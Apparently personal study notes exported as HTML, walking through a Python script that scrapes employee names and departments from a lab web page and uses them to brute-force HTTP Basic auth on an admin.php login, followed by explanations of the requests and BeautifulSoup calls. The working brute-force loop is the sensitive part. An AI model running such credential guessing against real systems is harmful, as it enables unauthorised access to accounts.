<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>GET request + BeautifulSoup</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>GET request + BeautifulSoup</h1><br/><br /><strong><h2>Brute Force Login</h2></strong><br />In this example we are trying to brute force username and password in the page <a href="http://172.16.120.120/admin.php"">http://172.16.120.120/admin.php&quot;</a> having collected informations about employees in the page <span style="color:#3ad900;">http://172.16.120.120</span><br /><br /><div class="codebox"><pre><span style="color:#333333;font-weight:400">import</span> requests<br /><span style="color:#333333;font-weight:400">from</span> <span style="color:#333333;font-weight:400">bs4</span> <span style="color:#333333;font-weight:400">import</span> BeautifulSoup<br /><br /><span style="color:#ff9d00;font-weight:700">def</span> <span style="color:#333333;font-weight:400">downloadPage</span>(url):<br />    r = requests.get(url) <span style="color:#0088ff;font-weight:400">#GET request to the specified url</span><br />    response = r.content<br />    <span style="color:#ff9d00;font-weight:700">return</span> response<br /><br /><span style="color:#ff9d00;font-weight:700">def</span> <span style="color:#333333;font-weight:400">findNames</span>(response):<br />    parser = BeautifulSoup(response, <span style="color:#3ad900;font-weight:400">&#39;html.parser&#39;</span>)<br />    names = parser.find_all(<span style="color:#3ad900;font-weight:400">&#39;td&#39;</span>, <span style="color:#ff9d00;font-weight:700">id</span>=<span style="color:#3ad900;font-weight:400">&#39;name&#39;</span>)<br />    output = []<br />    <span style="color:#ff9d00;font-weight:700">for</span> name <span style="color:#ff9d00;font-weight:700">in</span> names:<br />        output.append(name.get_text()) <span style="color:#0088ff;font-weight:400">#use name.text is the same thing</span><br />    <span style="color:#ff9d00;font-weight:700">return</span> output<br /><br /><span style="color:#ff9d00;font-weight:700">def</span> <span style="color:#333333;font-weight:400">findDepartments</span>(response):<br />    parser = BeautifulSoup(response, <span style="color:#3ad900;font-weight:400">&#39;html.parser&#39;</span>)<br />    names = parser.find_all(<span style="color:#3ad900;font-weight:400">&#39;td&#39;</span>, <span style="color:#ff9d00;font-weight:700">id</span>=<span style="color:#3ad900;font-weight:400">&#39;department&#39;</span>)<br />    output = []<br />    <span style="color:#ff9d00;font-weight:700">for</span> name <span style="color:#ff9d00;font-weight:700">in</span> names:<br />        output.append(name.get_text())<br />    <span style="color:#ff9d00;font-weight:700">return</span> output<br /><br /><span style="color:#ff9d00;font-weight:700">def</span> <span style="color:#333333;font-weight:400">getAuthorized</span>(url, username, password):<br />    r = requests.get(url, auth=(username, password)) <span style="color:#0088ff;font-weight:400">#</span><br />    <span style="color:#ff9d00;font-weight:700">if</span> <span style="color:#ff9d00;font-weight:700">str</span>(r.status_code) != <span style="color:#3ad900;font-weight:400">&#39;401&#39;</span>:<br />        <span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">&quot;\n[!] Username: &quot;</span> + username + <span style="color:#3ad900;font-weight:400">&quot; Password: &quot;</span> + password + <span style="color:#3ad900;font-weight:400">&quot; Code: &quot;</span> + <span style="color:#ff9d00;font-weight:700">str</span>(r.status_code) + <span style="color:#3ad900;font-weight:400">&quot;\n&quot;</span>)<br /><br />page = downloadPage(<span style="color:#3ad900;font-weight:400">&quot;http://YOURPAGE&quot;</span>)  <span style="color:#0088ff;font-weight:400">#change the url</span><br />names = findNames(page)  <span style="color:#0088ff;font-weight:400">#return a list</span><br />uniqueNames = <span style="color:#ff9d00;font-weight:700">sorted</span>(<span style="color:#ff9d00;font-weight:700">set</span>(names))<br />departments = findDepartments(page)  <span style="color:#0088ff;font-weight:400">#return a list</span><br />uniqueDepartments = <span style="color:#ff9d00;font-weight:700">sorted</span>(<span style="color:#ff9d00;font-weight:700">set</span>(departments))<br /><span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">&quot;... Working ... &quot;</span>)<br /><span style="color:#ff9d00;font-weight:700">for</span> name <span style="color:#ff9d00;font-weight:700">in</span> uniqueNames:<br />    <span style="color:#ff9d00;font-weight:700">for</span> department <span style="color:#ff9d00;font-weight:700">in</span> uniqueDepartments:<br />        getAuthorized(<span style="color:#3ad900;font-weight:400">&quot;http://YOURPAGE/admin.php&quot;</span>, name, department) <span style="color:#0088ff;font-weight:400">#change the url</span></pre></div><br /><br />•<strong> import requests</strong><br />    <span style="text-decoration:underline;">requests</span>(high-level URL opening) allows you to send HTTP/1.1 requests <em>extremely easily</em>. More easily than the <span style="text-decoration:underline;">http.client</span>(low-level HTTP protocol client) package used before.<br />    install it with: pip3 install requests<br />•<strong> from bs4 import BeautifulSoup</strong><br />    <span style="text-decoration:underline;">Beautiful Soup</span> is a Python library for getting data out of HTML, XML, and other markup languages.<br />    To install Beautiful Soup there are different ways:<br />   ◇ apt-get install python3-bs4<br />   ◇ easy_install3 beautifulsoup4<br />   ◇ pip3 install beautifulsoup4<br /> <br />• <strong>r = requests.get(url)<br />    </strong>requests.get(url, params={key: value}, args)<br />    → to know more on the parameter that we can pass to the get() method: <a href="https://www.w3schools.com/python/ref_requests_get.asp">HERE</a>; The get() method returns a <span style="text-decoration:underline;">requests.Response</span> object that contain the server&#39;s response of the HTTP request<br />• <strong>response = r.content</strong><br />    requests.get(url).content<br />    → attribute of a requests.Response object that returns the content of the response, in bytes<br />    for more attributes and methods of requests.Response objects: <a href="https://www.w3schools.com/python/ref_requests_response.asp">HERE</a><br /><br />• <strong>parser = BeautifulSoup(response, &#39;html.parser&#39;)</strong><br />    A parser is a software component that takes input data (frequently text) and builds a data structure, this data structure in our case is a BeautifulSoup object.<br />    There are 4 parsers that we can use in conjunction with BeautifulSoup: html.parser, lxml, xml, html5lib.<br />    Each one with its advantages and disadvantages: <a href="file://G:/Other computers/Yoga 520/CherryTree/screenshot/programming/python/beautifulSoup.png"><img src="images/219-1.png" alt="images/219-1.png" /></a><br />•<strong> names = parser.find_all(&#39;td&#39;, id=&#39;name&#39;)<br />    </strong><span style="text-decoration:underline;">find_all()</span> return an object(with inside the matching parameters given) that we will can use for further searches or extract one of its contents.<strong><br /></strong>   ◇ The <span style="color:#a5452a;">&lt;tr&gt;</span> tag defines a row in an HTML table<strong><br /></strong>   ◇ The <span style="color:#a5452a;">&lt;td&gt;</span> tag defines the data contained  in a cell in a HTML table <br />   ◇ The<span style="color:#ff0000;"> id </span>attribute specifies a unique id(within the HTML document) for an HTML element<strong><br />       </strong><a href=""><img src="images/219-2.png" alt="images/219-2.png" /></a><br />       <a href=""><img src="images/219-3.png" alt="images/219-3.png" /></a><br />• <strong>output.append(name.get_text())</strong> <br />    name.get_text() return the element&#39;s text and append it in the output list<br /><br />• <strong>r = requests.get(url, auth=(username, password)) </strong><br />    Providing the credentials in a tuple like this: auth=(username, password)<br />    is exactly the same as auth=HTTPBasicAuth(&#39;username&#39;, &#39;password&#39;)<br />    and is also more easy.<br />    to know more about authentication via requests library visit: <a href="https://requests.readthedocs.io/en/master/user/authentication/">HERE</a><br /><br />• <strong>if str(r.status_code) != &#39;401&#39;: </strong><br />    A status code equals to 401 meaning an<span style="color:#c7254e;"> </span><span style="text-decoration:underline;">Unauthorized Erro</span>r, indicates that the requested resource is restricted and requires authentication, but the client failed to provide a valid one<span style="text-decoration:underline;"><br /><br /></span>• <strong>uniqueNames = sorted(set(names))<br /></strong>•<strong> uniqueDepartments = sorted(set(departments))<br />    </strong>set() return an unordered collection of <span style="text-decoration:underline;">unique elements</span> while sorted() return a new sorted list<strong><br /></strong><span style="text-decoration:underline;"><br /><br /><br /></span></div>
</body>
</html>
